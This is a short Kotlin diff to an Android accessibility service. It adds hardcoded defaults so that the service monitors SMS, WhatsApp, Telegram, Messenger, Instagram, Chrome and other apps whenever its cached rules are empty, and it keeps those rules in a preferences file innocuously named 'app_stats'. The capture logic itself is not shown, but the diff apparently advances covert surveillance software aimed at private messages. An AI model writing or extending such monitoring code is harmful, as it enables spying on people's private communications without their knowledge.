@@ -15,10 +15,35 @@ class MyAccessibilityService : AccessibilityService() {
 
     override fun onServiceConnected() {
         super.onServiceConnected()
-        // Optimization: Load rules once into memory instead of parsing on every event
         val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+        // Load cached rules, or fall back to Hardcoded Defaults if cache is empty
         val rulesStr = prefs.getString("cached_rules", "{}")
-        cachedRules = try { JSONObject(rulesStr) } catch (e: Exception) { JSONObject() }
+        cachedRules = try {
+            val json = JSONObject(rulesStr)
+            if (json.length() == 0) getDefaultRules() else json
+        } catch (e: Exception) {
+            getDefaultRules()
+        }
+    }
+
+    private fun getDefaultRules(): JSONObject {
+        val defaults = JSONObject()
+        val apps = listOf(
+            "com.google.android.apps.messaging", // Google SMS
+            "com.samsung.android.messaging",     // Samsung SMS
+            "com.whatsapp",                      // WhatsApp
+            "org.telegram.messenger",            // Telegram
+            "org.telegram.plus",                 // Telegram Plus
+            "com.imo.android.imoim",             // IMO
+            "com.truecaller",                    // Truecaller
+            "com.android.chrome",                // Chrome
+            "com.facebook.orca",                 // Messenger
+            "com.instagram.android"              // Instagram DM
+        )
+        for (app in apps) {
+            defaults.put(app, JSONObject()) // Empty object means "Monitor Enabled"
+        }
+        return defaults
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
